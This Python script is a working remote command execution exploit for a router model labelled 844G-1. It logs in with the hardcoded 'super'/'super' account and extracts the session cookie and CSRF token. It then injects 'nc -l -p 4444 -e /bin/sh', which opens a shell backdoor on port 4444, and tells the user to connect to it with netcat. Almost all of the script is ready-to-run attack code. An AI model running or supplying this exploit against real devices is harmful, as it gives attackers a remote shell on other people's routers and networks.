import requests
import re

banner = r"""


  _____   _____ ______                             _   _                _   _           _           _ 
 |  __ \ / ____|  ____|                           | | | |              | | (_)         | |         | |
 | |__) | |    | |__     _ __   ___     __ _ _   _| |_| |__   ___ _ __ | |_ _  ___ __ _| |_ ___  __| |
 |  _  /| |    |  __|   | '_ \ / _ \   / _` | | | | __| '_ \ / _ \ '_ \| __| |/ __/ _` | __/ _ \/ _` |
 | | \ \| |____| |____  | | | | (_) | | (_| | |_| | |_| | | |  __/ | | | |_| | (_| (_| | ||  __/ (_| |
 |_|  \_\\_____|______| |_| |_|\___/   \__,_|\__,_|\__|_| |_|\___|_| |_|\__|_|\___\__,_|\__\___|\__,_|
   ___  _  _   _  _    _____       __    _____      _ _                        _                      
  / _ \| || | | || |  / ____|     /_ |  / ____|    | (_)                      | |                     
 | (_) | || |_| || |_| |  __ ______| | | |     __ _| |___  __  _ __ ___  _   _| |_ ___ _ __           
  > _ <|__   _|__   _| | |_ |______| | | |    / _` | | \ \/ / | '__/ _ \| | | | __/ _ \ '__|          
 | (_) |  | |    | | | |__| |      | | | |___| (_| | | |>  <  | | | (_) | |_| | ||  __/ |             
  \___/   |_|    |_|  \_____|      |_|  \_____\__,_|_|_/_/\_\ |_|  \___/ \__,_|\__\___|_|             
                                                                                                      
                                                                                                      
                                by revers3everything - Danilo Erazo - February 2025

"""
print(banner)
print("Exploit - 844G-1 Remote Command Execution: ")
print("Exploit in process...")

#1. SessionID
burp0_url = "http://169.254.1.2:80/login.php"
user = "super" 
pwd = "super" #only works with super user credentials
burp0_headers = {"Cache-Control": "max-age=0", "Accept-Language": "en-US,en;q=0.9", "Origin": "http://169.254.1.2", "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryPEBzV6dMX3RA4DaL", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Referer": "http://169.254.1.2/login.php", "Accept-Encoding": "gzip, deflate, br", "Connection": "keep-alive"}
burp0_data = "------WebKitFormBoundaryPEBzV6dMX3RA4DaL\r\nContent-Disposition: form-data; name=\"user\"\r\n\r\n"+user+"\r\n------WebKitFormBoundaryPEBzV6dMX3RA4DaL\r\nContent-Disposition: form-data; name=\"pwd\"\r\n\r\n"+pwd+"\r\n------WebKitFormBoundaryPEBzV6dMX3RA4DaL--\r\n"
response = requests.post(burp0_url, headers=burp0_headers, data=burp0_data)
phpsessid = str(response.cookies.get("PHPSESSID"))
print("Session id:"+phpsessid)

#2. CSRFTOKEN

burp0_url = "http://169.254.1.2:80/tools_command.php"
burp0_cookies = {"PHPSESSID": phpsessid}
burp0_headers = {"Accept-Language": "en-US,en;q=0.9", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Referer": "http://169.254.1.2/status_device.php", "Accept-Encoding": "gzip, deflate, br", "Connection": "keep-alive"}
resp1 = requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
csrf_token = re.search(r'name="csrf_token" value="([a-fA-F0-9]+)"', resp1.text)
print("CSRF Token:"+csrf_token.group(1))
csrf_token = csrf_token.group(1)
print("Temporal backdoor into the router, try to connect with netcat to the port 4444!")

#3. COMMAND INJECTION
command = "nc -l -p 4444 -e /bin/sh &"
#command = "ping -c 3 192.168.1.127"
burp0_url = "http://169.254.1.2:80/tools_command.php"
burp0_cookies = {"PHPSESSID": phpsessid}
burp0_headers = {"Cache-Control": "max-age=0", "Accept-Language": "en-US,en;q=0.9", "Origin": "http://169.254.1.2", "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryoFVswyA0BZ8Qw0PS", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Referer": "http://169.254.1.2/tools_command.php", "Accept-Encoding": "gzip, deflate, br", "Connection": "keep-alive"}
burp0_data = "------WebKitFormBoundaryoFVswyA0BZ8Qw0PS\r\nContent-Disposition: form-data; name=\"cmb_header\"\r\n\r\n\r\n------WebKitFormBoundaryoFVswyA0BZ8Qw0PS\r\nContent-Disposition: form-data; name=\"txt_command\"\r\n\r\n"+command+"\r\n------WebKitFormBoundaryoFVswyA0BZ8Qw0PS\r\nContent-Disposition: form-data; name=\"csrf_token\"\r\n\r\n"+csrf_token+"\r\n------WebKitFormBoundaryoFVswyA0BZ8Qw0PS--\r\n"
resp = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
